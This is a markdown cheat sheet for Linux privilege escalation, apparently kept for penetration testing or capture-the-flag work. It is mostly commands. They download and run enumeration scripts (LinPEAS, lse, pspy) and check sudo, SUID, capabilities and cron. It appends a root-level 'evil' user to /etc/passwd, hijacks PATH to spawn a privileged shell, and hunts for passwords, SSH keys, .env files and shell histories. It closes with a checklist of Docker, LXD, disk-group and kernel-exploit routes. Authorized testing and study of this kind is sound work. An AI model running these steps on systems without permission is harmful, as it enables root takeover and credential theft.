> https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
> https://gtfobins.org/
# Linux Privilege Escalation

## Automated enumeration (run first, read while running)
```bash
# LinPEAS - the standard
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a | tee linpeas-output.txt

# linux-smart-enumeration (alternative / second opinion)
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
./lse.sh -l 2

# pspy (process monitoring - catches cron jobs)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

```bash
# Run with a 5-second timeout on the sudo check
./linpeas.sh -t 5

# Or completely skip the sudo check if it keeps breaking
./linpeas.sh -s
```


## Manual quick wins

### Sudo
```bash
sudo -l
# anything in https://gtfobins.github.io/ → win
```

### SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
# check each against gtfobins
```

### Capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid on python/perl/etc = win
```

### Cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
# look for: writable scripts, PATH manipulation, wildcards
```

### Writable /etc/passwd
```bash
ls -la /etc/passwd
# if writable: add user with no password
# openssl passwd -1 -salt x password
# echo 'evil:x:0:0::/root:/bin/bash' >> /etc/passwd
```

### Kernel exploits (last resort)
```bash
uname -a
# search exploit-db for kernel version
# common: DirtyCow, DirtyPipe, PwnKit (polkit)
```

### PATH hijacking
```bash
# if SUID binary calls another binary by name (not full path)
echo 'bash -p' > /tmp/binary_name
chmod +x /tmp/binary_name
export PATH=/tmp:$PATH
# run the SUID binary
```

### Mounted filesystems / mounts
```bash
mount
cat /etc/fstab
# nofail, exec, suid options on weird mounts = interesting
```

### Files with creds
```bash
grep -ri "password" /etc/ 2>/dev/null
grep -ri "passwd" /var/www/ 2>/dev/null
find / -name "*.conf" -readable 2>/dev/null | head
find / -name ".env" 2>/dev/null
find /home -name "*.bak" 2>/dev/null
find / -name "id_rsa*" 2>/dev/null
```

### History files
```bash
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
```

### Running services as root
```bash
ps aux | grep root
netstat -tulpn       # services only on localhost = port forward candidate
ss -tulpn
```

## Common vectors checklist

- [ ] cat /etc/passwd
- [ ] sudo -l → gtfobins
- [ ] SUID → gtfobins
- [ ] Capabilities → gtfobins
- [ ] Cron jobs (writable scripts, PATH, wildcards)
- [ ] Writable /etc/passwd or /etc/shadow
- [ ] SSH keys readable
- [ ] Password in env vars / config files
- [ ] Bash history
- [ ] Loopback-only services → port forward / chisel
- [ ] Docker group → docker run mount /
- [ ] LXD group → image with /etc passthrough
- [ ] Disk group → debugfs /etc/shadow
- [ ] NFS no_root_squash
- [ ] Kernel exploit (last resort, can crash box)
